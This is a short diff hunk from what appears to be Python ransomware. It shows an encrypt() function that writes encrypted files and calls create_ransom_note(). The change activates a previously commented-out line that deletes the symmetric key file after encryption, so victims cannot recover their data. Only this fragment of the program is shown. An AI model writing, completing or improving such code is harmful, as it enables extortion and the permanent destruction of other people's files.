@@ -281,7 +281,7 @@ def encrypt(target, file_path):
                 encrypted_file.write(cipher)
         
         create_ransom_note()
-        #os.remove(f'{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key')
+        os.remove(f'{pathlib.Path(sys.argv[0]).parent.absolute()}/symmetric_key.key')
     else:
         print("Target empty.")
 
